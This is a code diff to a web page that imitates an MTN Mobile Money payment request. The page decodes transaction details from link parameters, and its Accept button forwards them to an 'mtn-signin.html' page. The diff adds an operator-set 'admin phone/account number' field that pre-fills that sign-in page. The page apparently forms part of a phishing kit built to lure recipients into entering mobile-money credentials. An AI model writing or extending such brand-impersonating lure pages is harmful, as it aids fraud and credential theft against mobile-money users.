@@ -292,12 +292,8 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ============================================================
-     Decode payload from URL — supports ?r=CODE and ?d=BASE64
-  ============================================================ */
   async function decodeData() {
     const params = new URLSearchParams(location.search);
-
     const code = params.get('r');
     if (code) {
       try {
@@ -306,7 +302,6 @@
         return await res.json();
       } catch (e) { return null; }
     }
-
     const raw = params.get('d');
     if (!raw) return null;
     try {
@@ -316,9 +311,6 @@
     } catch (e) { return null; }
   }
 
-  /* ============================================================
-     Currency formatting
-  ============================================================ */
   const CURRENCY_LOCALE = {
     XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH', USD: 'en-US'
   };
@@ -337,18 +329,12 @@
     } catch (e) { return n + ' ' + (currency || ''); }
   }
 
-  /* ============================================================
-     MTN support numbers
-  ============================================================ */
   const SUPPORT_NUMBERS = {
     'Cameroon': '8787', 'Zambia': '111', 'Zambia (MTN)': '111',
     'Uganda': '100', 'Uganda (MTN)': '100',
     'Ghana': '100', 'Ghana (MTN)': '100'
   };
 
-  /* ============================================================
-     Date + toast
-  ============================================================ */
   function formatDate(ts) {
     const d = ts ? new Date(ts) : new Date();
     return d.toLocaleString(undefined, {
@@ -363,14 +349,9 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
 
-  /* ============================================================
-     State
-  ============================================================ */
-  let tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', dt: '' };
+  /* State — includes `an` (admin phone/account number) and `dt` */
+  let tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '' };
 
-  /* ============================================================
-     Init — decode, then render everything
-  ============================================================ */
   async function init() {
     const data = await decodeData();
 
@@ -393,18 +374,15 @@
       pm:  data.pm  || '',
       sn:  data.sn  || '',
       mk:  data.mk  || '',
+      an:  data.an  || '',
       dt:  data.dt  || data.createdAt || ''
     };
 
-    // Amount + currency
     document.getElementById('amtCur').textContent = tx.cur || '';
     document.getElementById('amtVal').textContent =
       formatAmount(tx.am, tx.cur).replace(' ' + tx.cur, '');
-
-    // Recipient
     document.getElementById('reqRecipient').textContent = tx.rn || '—';
 
-    // Details
     const rows = [
       { k: 'Country',          v: tx.c },
       { k: 'Payment method',   v: tx.pm },
@@ -420,14 +398,9 @@
     });
     document.getElementById('detailsPanel').innerHTML = html;
 
-    // Support
-    const supportNum = SUPPORT_NUMBERS[tx.c];
-    document.getElementById('supportNum').textContent = supportNum || '—';
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
   }
 
-  /* ============================================================
-     Copy receipt
-  ============================================================ */
   function copyReceipt() {
     const lines = [
       'MTN Mobile Money — Payment Request',
@@ -465,6 +438,8 @@
 
   /* ============================================================
      Accept → sign-in page
+     Now also passes `an` (admin phone) and `dt` (date) so the
+     sign-in page can pre-fill the phone and show the date.
   ============================================================ */
   function acceptPayment() {
     const btn = document.getElementById('acceptBtn');
@@ -472,8 +447,16 @@
     btn.textContent = 'Redirecting…';
 
     const q = new URLSearchParams({
-      tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-      c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk
+      tx:  tx.ref,
+      am:  tx.am,
+      cur: tx.cur,
+      rn:  tx.rn,
+      c:   tx.c,
+      pm:  tx.pm,
+      sn:  tx.sn,
+      mk:  tx.mk,
+      an:  tx.an,          // ← admin phone / account number
+      dt:  tx.dt           // ← admin-stamped transaction date
     });
     setTimeout(() => {
       window.location.href = 'mtn-signin.html?' + q.toString();
